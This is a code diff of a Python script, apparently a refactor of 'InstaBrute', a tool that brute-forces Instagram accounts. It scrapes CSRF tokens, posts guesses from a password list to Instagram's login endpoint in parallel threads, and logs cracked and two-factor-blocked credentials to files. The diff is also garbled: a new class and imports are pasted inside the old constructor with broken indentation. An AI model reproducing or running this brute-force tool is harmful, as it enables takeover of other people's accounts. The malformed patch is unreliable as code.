@@ -31,65 +31,83 @@ Please use it before running the tool.\033[32m.''')
 class InstaBrute(object):
     def __init__(self):
 
+       import os
+import re
+import sys
+import threading
+import time
+from datetime import datetime
+import requests
+
+
+class InstaBrute:
+    """A class for brute-forcing Instagram accounts."""
+
+    def __init__(self):
+        """Initialize the class and start the brute-force attack."""
+
         try:
-            user = input('username : ')
-            Combo = input('passList : ')
-            print('\n----------------------------')
+            username = input('username: ')
+            password_list = input('passList: ')
+            print('----------------------------')
+        except KeyboardInterrupt:
+            print('\nExiting the program.')
+            sys.exit(1)
 
-        except:
-            print(' The tool was arrested exit ')
-            sys.exit()
+        with open(password_list, 'r') as file:
+            password_list = file.read().splitlines()
 
-        with open(Combo, 'r') as x:
-            Combolist = x.read().splitlines()
-        thread = []
-        self.Coutprox = 0
-        for combo in Combolist:
-            password = combo.split(':')[0]
-            t = threading.Thread(target=self.New_Br, args=(user, password))
+        threads = []
+        self.proxy_count = 0
+
+        for password in password_list:
+            t = threading.Thread(target=self.new_brute, args=(username, password))
             t.start()
-            thread.append(t)
+            threads.append(t)
             time.sleep(0.9)
-        for j in thread:
-            j.join()
 
-    def cls(self):
-        linux = 'clear'
-        windows = 'cls'
-        os.system([linux, windows][os.name == 'nt'])
+        for thread in threads:
+            thread.join()
 
-    def New_Br(self, user, pwd):
+    def new_brute(self, username, password):
+        """Attempt to log in to an Instagram account using the given username and password."""
+
         link = 'https://www.instagram.com/accounts/login/'
         login_url = 'https://www.instagram.com/accounts/login/ajax/'
-
-        time = int(datetime.now().timestamp())
+        timestamp = int(datetime.now().timestamp())
 
         payload = {
-            'username': user,
-            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
+            'username': username,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
             'queryParams': {},
             'optIntoOneTap': 'false'
         }
 
-        with requests.Session() as s:
-            r = s.get(link)
-            csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
-            r = s.post(login_url, data=payload, headers={
+        with requests.Session() as session:
+            response = session.get(link)
+            csrf_token = re.findall(r"csrf_token\":\"(.*?)\"", response.text)[0]
+            response = session.post(login_url, data=payload, headers={
                 "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                 "X-Requested-With": "XMLHttpRequest",
                 "Referer": "https://www.instagram.com/accounts/login/",
-                "x-csrftoken": csrf
+                "x-csrftoken": csrf_token
             })
-            print(f'{user}:{pwd}\n----------------------------')
 
-            if 'authenticated": true' in r.text:
-                print(('' + user + ':' + pwd + ' --> Good hack '))
-                with open('good.txt', 'a') as x:
-                    x.write(user + ':' + pwd + '\n')
-            elif 'two_factor_required' in r.text:
-                print(('' + user + ':' + pwd + ' -->  Good It has to be checked '))
-                with open('results_NeedVerfiy.txt', 'a') as x:
-                    x.write(user + ':' + pwd + '\n')
+            if 'authenticated": true' in response.text:
+                print(f'{username}:{password} --> Good hack')
+                with open('good.txt', 'a') as file:
+                    file.write(f'{username}:{password}\n')
+            elif 'two_factor_required' in response.text:
+                print(f'{username}:{password} -->  Good It has to be checked')
+                with open('results_NeedVerfiy.txt', 'a') as file:
+                    file.write(f'{username}:{password}\n')
+
+    @staticmethod
+    def clear_screen():
+        """Clear the console screen."""
+
+        os.system('cls' if os.name == 'nt' else 'clear')
+
 
 
 InstaBrute()
